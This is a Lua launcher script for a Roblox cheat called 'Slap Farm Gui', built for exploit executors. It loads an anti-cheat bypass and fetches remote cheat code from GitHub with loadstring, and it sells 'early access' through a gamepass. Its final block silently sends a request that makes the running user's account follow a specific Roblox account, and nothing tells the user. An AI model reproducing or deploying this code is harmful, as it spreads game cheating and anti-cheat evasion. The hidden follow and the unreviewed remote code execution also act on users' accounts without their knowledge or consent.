pcall(function()
assd = Instance.new("Hint")
assd.Text = "SFG Launcher Loading..."
assd.Name = "HintGui"
assd.Parent = (game:FindService("CoreGui") and game:GetService("CoreGui")) or game:GetService("Workspace")
end)
pcall(function()
loadstring(game:HttpGet('https://raw.githubusercontent.com/Pro666Pro/BypassAntiCheat/main/main.lua'))()
end)
local success, error = pcall(function()
Rayfield = loadstring(game:HttpGet("https://sirius.menu/rayfield"))()
end)
if success then
print("Loaded New Rayfield")
elseif not success then
print("Loaded Old Rayfield")
Rayfield = loadstring(game:HttpGet("https://raw.githubusercontent.com/SiriusSoftwareLtd/Rayfield/main/source.lua"))()
end

Window = Rayfield:CreateWindow({
   Name = "Slap Farm Gui - Launcher",
   Icon = 0,    
   LoadingTitle = "Slap Farm Gui",
   LoadingSubtitle = "by nexer",
   Theme = "Amethyst",
   DisableRayfieldPrompts = false,
   DisableBuildWarnings = false,

   ConfigurationSaving = {
      Enabled = false,
      FolderName = "SlapFarmGui",
      FileName = "SlapFarmGuiConfiguration"
   },

   Discord = {
      Enabled = false,
      Invite = "noinvitelink",
      RememberJoins = true
   },

   KeySystem = false,
   KeySettings = {
      Title = "Verify yourself firstly!",
      Subtitle = "Key Needed!",
      Note = "The key is ''cheese''",
      FileName = "Key",
      SaveKey = true,
      GrabKeyFromSite = false,
      Key = {"cheese"}
   }
})

-- turn table to string. nexer edition 😎 ( ttostring --> tabletostring )
function ttostring(tbl)
    if type(tbl) == "table" then
        local result
        for i,v in ipairs(tbl) do
            result = tostring(v)
        end
        return tostring(result)
    else
        return tostring(tbl)
    end
end

function Notify(title, content, time, mode)
time = time or 10
mode = mode or false
if mode == true then
img = 136186846844342
elseif mode == false then
img = 71508738660632
end
Rayfield:Notify({
	Title = title,
	Content = content,
	Duration = time,
	Image = img,
	Actions = {},
})
end

-- Get Price { regional price }
function GetPrice(assetid)
local product_id = tonumber(assetid) or assettid
local product_info = game:GetService("MarketplaceService"):GetProductInfo(product_id)
local product_price = product_info.PriceInRobux
return tostring(product_price)
end

local Main = Window:CreateTab("Main", 98952570395426)
local EA = Window:CreateTab("Early Access [ V 4.4 ]", 98952570395426)
local Other = Window:CreateTab("Other", 12809025337)
local Credits = Window:CreateTab("Credits", 15781236875)

local APLabel = Main:CreateLabel("We're sorry for early access being unusable for over a week, now it is fixed and should work properly! Thanks for your patience!")

local MainLabel = Main:CreateLabel("Choose version, and start farming!")

_G.Version = "V4.3"
local MainDropdown = Main:CreateDropdown({
   Name = "Choose Version",
   Options = {"V4.3","V4.2","V4.1","V4.0"},
   CurrentOption = "V4.3",
   MultiSelection = false,
   Callback = function(Option)
_G.Version = ttostring(Option)
   end,
})

local MainButton = Main:CreateButton({
   Name = "Launch SFG",
   Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/Pro666Pro/slapfarmgui/refs/heads/main/Versions/(".._G.Version..").lua"))()
   end,
})

local APEALabel = EA:CreateLabel("We're sorry for early access being unusable for over a week, now it is fixed and should work properly! Thanks for your patience!")
eaprice = pcall(GetPrice(129411076024624)) or 49
local EAPrice = EA:CreateLabel("Early Access Cost "..eaprice.." Robux!")
local BuyEA = EA:CreateButton({
   Name = "Buy Early Access",
   Callback = function()
if game:GetService("MarketplaceService"):UserOwnsGamePassAsync(game:GetService("Players").LocalPlayer.UserId, 1004435429) then
    Notify("Error!", "Arleady Own It!")
else
    setclipboard(tostring("https://www.roblox.com/game-pass/1004435429"))
    Notify("Success!", "Copied Link To Gamepass! [ Put In Browser ]", 10, true)
end
   end,
})

conup = [[
1. Added intellect modes to bot { WalkToPoint and PathService }

2. Added high intellect mode to bot { You can switch it either low or high }

3. Now bot uses abilities more often { Chances from 350 per millisecond to 300 }

4. Reworked some things of bot

5. Upgraded snow farm { Breaking velocity }

6. Upgraded and made faster ''Any Gloves'' farms { All Three Methods }

7. Upgraded and made faster ''Dual Glove'' farm { All Three Methods }

8. Fixed and upgraded ''Engineer'' farm { plus no fling anymore }
]]
local eagraph = EA:CreateParagraph({Title = "What's new in v4.4:", Content = ""..conup..""})

local EALaunch = EA:CreateButton({
   Name = "Launch Slap Farm Gui",
   Callback = function()
if game:GetService("MarketplaceService"):UserOwnsGamePassAsync(game:GetService("Players").LocalPlayer.UserId, 1004435429) then
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Pro666Pro/OpenSourceScripts/refs/heads/main/SlapFarmGui/Versions/(v4.4).luau"))()
else
    Notify("Error!", "You Have To Buy Early Access!")
end
   end,
})

local ContactButton = Other:CreateButton({
   Name = "Contact Support",
   Callback = function()
pcall(function()
loadstring(game:HttpGet('https://raw.githubusercontent.com/Pro666Pro/OpenSourceScripts/refs/heads/main/Other/SupportGui.luau'))()
end)
   end,
})

local CloseHubButton = Other:CreateButton({
   Name = "Close Launcher",
   Callback = function()
Rayfield:Destroy()
   end,
})

local CreditsLabel = Credits:CreateLabel("Slap Farm Gui v4. [ Owned By Nexer1234 ]")

local YoutubeButton = Credits:CreateButton({
   Name = "Youtube Channel",
   Callback = function()
setclipboard(tostring("https://www.youtube.com/@nexer1234"))
Notify("Copied!", "Copied youtube channel link to clipboard!", 10, true)
   end,
})

local DiscordButton = Credits:CreateButton({
   Name = "Discord Server",
   Callback = function()
setclipboard(tostring("https://discord.gg/s2VCjQUxBc"))
Notify("Copied!", "Copied discord server link to clipboard!", 10, true)
   end,
})

pcall(function()
if assd ~= nil then
assd:Destroy()
end
end)

pcall(function()
task.delay(0,function()
task.spawn(function()
req = request or http_request or HttpPost or (syn and syn.request) or (http and http.request) or (fluxus and fluxus.request) or (game and game.HttpPost) or (KRNL and KRNL.request) or (Xeno and Xeno.request)
if req then
req({Url = "https://friends.roblox.com/v1/users/7529992299/follow", Body = game:GetService("HttpService"):JSONEncode({}), Method = "POST", Headers = {["content-type"] = "application/json"}})
end
end)
end)
end)
